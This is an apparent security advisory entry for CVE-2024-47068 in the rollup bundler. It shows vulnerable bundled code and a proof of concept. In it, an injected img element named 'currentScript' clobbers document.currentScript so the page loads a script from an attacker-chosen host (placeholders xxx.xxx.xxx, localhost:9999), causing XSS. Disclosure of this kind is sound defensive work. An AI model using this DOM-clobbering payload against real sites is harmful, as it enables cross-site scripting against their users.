## rollup

### Meta

+ Library: rollup
+ Version: v4.21.3
+ Stars: 25.2K
+ Payload: ```<img src="https://xxx.xxx.xxx" name="currentScript">```
+ Impact: XSS
+ CVE: CVE-2024-47068
+ Status: Fixed
+ Foundby: TheHulk

### Library

https://github.com/rollup/rollup


### Vulnerable Code Snippet

```javascript
var _documentCurrentScript = typeof document !== 'undefined' ? document.currentScript : null;
var s = document.createElement('script');
s.src = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(__filename).href : (_documentCurrentScript && _documentCurrentScript.src || new URL('bundle.js', document.baseURI).href)) + 'extra.js';
document.head.append(s);
```

## PoC

as an example, bundle the js below: `rollup main.js --format cjs --file bundle.js`.

```javascript
var s = document.createElement('script')
s.src = import.meta.url + 'extra.js'
document.head.append(s)
```

example html:

<!-- ```html
<img name="currentScript" src="//xxx.xxx.xxx"></img>
<script src="dist/index.js"></script>
``` -->

```html
<!--Library-->
<script src="bundle.js"></script>
<!--Library-->

<!--Payload-->
<img name="currentScript" src="//localhost:9999"></img>
<!--Payload-->
```

